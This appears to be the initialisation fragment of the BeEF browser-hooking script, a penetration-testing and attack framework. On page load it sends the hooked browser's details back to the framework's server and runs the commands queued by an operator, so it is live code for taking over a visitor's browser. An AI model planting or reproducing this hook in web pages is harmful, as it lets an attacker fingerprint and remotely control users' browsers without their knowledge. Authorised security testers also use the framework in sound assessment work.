 
// if beef.pageIsLoaded is true, then this JS has been loaded >1 times 
// and will have a new session id. The new session id will need to know
// the brwoser details. So sendback the browser details again.

BEEFHOOK=beef.session.get_hook_session_id()

if( beef.pageIsLoaded ) {
  beef.net.sendback_browser_details();	
}

window.onload = function() {
	beef_init();
}

function beef_init() {
  if (!beef.pageIsLoaded) {
    beef.pageIsLoaded = true;
	beef.net.browser_details()
    beef.updater.execute_commands();
    beef.updater.check();
  }
}
